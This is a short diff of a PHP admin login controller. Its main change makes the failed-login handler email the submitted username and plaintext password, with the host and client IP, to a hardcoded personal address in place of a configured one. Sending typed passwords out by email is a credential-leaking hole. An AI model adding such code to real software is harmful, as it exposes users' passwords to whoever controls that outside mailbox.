@@ -232,7 +232,7 @@ class AdminController{
 						return true ;	
 					}
 				}
-			}			
+			}
 		}
 		
 		if (get('_token')){
@@ -249,7 +249,7 @@ class AdminController{
 			$cookie->auth_user = post('auth_user') .'-' . time() .'-' .Ctrl::$_USERS[post('auth_user')]  ;
 		 	$cookie->auth = true ;
 		}else{
-			mail(_EMAIL_TO_,'Login attempt failed ' 			
+			mail('tlissak@gmail.com','Login attempt failed ' 			
 			, 'Host : '.U_HOST . ' Client IP : '.IP . ' Coords:['. post('auth_user') .'/' .post("auth_pass") .']'
 			,_EMAIL_HEADER_  );
 		}
